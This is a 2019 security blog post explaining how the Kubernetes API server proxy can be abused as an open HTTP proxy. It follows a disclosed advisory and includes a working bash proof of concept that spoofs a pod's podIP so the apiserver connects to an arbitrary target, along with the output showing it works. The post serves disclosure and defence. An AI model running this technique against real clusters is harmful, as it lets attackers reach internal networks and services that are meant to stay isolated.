+++
authors = ["Michael Schubert"]
date = "2019-02-01T12:00:00+02:00"
description = "Abusing Kubernetes API server proxying"
draft = false
tags = ["kubernetes", "security"]
title = "Abusing Kubernetes API server proxying"
topics = ["kubernetes", "security"]
postImage =  "article-hero.jpg"
+++

The [Kubernetes API server
proxy](https://kubernetes.io/docs/concepts/cluster-administration/proxies/)
allows a user outside of a Kubernetes cluster to connect to cluster IPs which
otherwise might not be reachable. For example, this allows accessing a service
which is only exposed within the cluster’s network. The apiserver acts as a
proxy and bastion between user and in-cluster endpoint.

<figure class="img-fluid w-75 mx-auto">
	<img src="/media/kubernetes-apiserver-proxying.svg" class="img-fluid">
</figure>

### API server proxy security advisory

Last summer, while performing penetration testing, we found an issue with
Kubernetes API server proxying. We took this discovery to the [private
Kubernetes security
list](https://kubernetes.io/docs/reference/issues-security/security/#report-a-vulnerability)
which recently lead to a [security
advisory](https://groups.google.com/forum/#!topic/kubernetes-dev/P0ghX_DViy8).

"_Operators of the API server are strongly advised to operate the Kubernetes
API server in the same network as the nodes or firewall it sufficiently. It is
highly recommended to not run any other services you wish to be secure and
isolated on the same network as the cluster unless you firewall it away from
the cluster, specifically any outbound connections from the API server to
anything else. The Kubernetes control plane has many user-configurable features
(aggregated APIs, dynamic admission webhooks, and conversion webhooks coming
soon) which involve the Kubernetes API server sourcing network traffic._"

Prior to the advisory an [update to
Kubernetes](https://github.com/kubernetes/kubernetes/pull/71980/files) was made
where proxy functionality was disabled for loopback and link-local addresses.
That makes it no longer possible to abuse apiserver proxying for pods to
reach, for example,  sidecar containers or the well-known link-local address
169.254.169.254. This address is commonly used for meta data services in cloud
environments (e.g. AWS) and often gives access to secret data.

### API server remains open to abuse

It's great that we've now got those cases covered, but the apiserver still can
be abused as an open HTTP proxy. Thus, it remains crucial to isolate the
network correctly. Let's take a closer look to understand why this is.

The interesting question to investigate is, "Can we trick the
apiserver into connecting to IP addresses that are not part of the cluster’s
network and not assigned to a pod or service in the cluster?" Additionally, in a
Kubernetes setup where the Kubernetes API server is operated in a different
network than the worker nodes (as for example on GKE): can we abuse the
apiserver’s built-in proxy to send requests to IP addresses within the
apiserver’s network or to sidecar containers of it (in a [self-hosted Kubernetes cluster](https://github.com/kubernetes-incubator/bootkube))
that are not meant to be reachable for users at all?

When the apiserver receives a proxy request for a service or pod, it looks up
an [endpoint](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.13/#endpoints-v1-core)
or pod IP address to forward the request to. Both endpoint and pod IP are
populated from the pod’s [status](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.13/#podstatus-v1-core)
which contains the `podIP` field as reported by the kubelet. So what happens if
we send our own pod status for a nginx pod as shown in the following script?

```
#!/bin/bash

set -euo pipefail

readonly PORT=8001
readonly POD=nginx-7db75b8b78-r7p79
readonly TARGETIP=172.217.19.78

while true; do
  curl -v -H 'Content-Type: application/json' \
    "http://localhost:${PORT}/api/v1/namespaces/default/pods/${POD}/status" >"${POD}-orig.json"

  cat $POD-orig.json |
    sed 's/"podIP": ".*",/"podIP": "'${TARGETIP}'",/g' \
      >"${POD}-patched.json"

  curl -v -H 'Content-Type:application/merge-patch+json' \
    -X PATCH -d "@${POD}-patched.json" \
    "http://localhost:${PORT}/api/v1/namespaces/default/pods/${POD}/status"

  rm -f "${POD}-orig.json" "${POD}-patched.json"
done
```

From the apiserver’s perspective, the pod now has IP address 172.217.19.78.
When we try to connect to the pod via kubectl proxy, the apiserver will in fact
establish a HTTP connection to 172.217.19.78, our target IP.

```
curl localhost:8001/api/v1/namespaces/default/pods/nginx-7db75b8b78-r7p79/proxy/
…
<a href="//www.google.com/"/><span id="logo" aria-label="Google"></span></a>
...
```

As demonstrated, we can indeed trick the apiserver. The moral of this story is to follow the advisory's recommendation and isolate your network properly.


If you need help improving the security of your Kubernetes environment, please contact us
at [hello@kinvolk.io](mailto:hello@kinvolk.io).
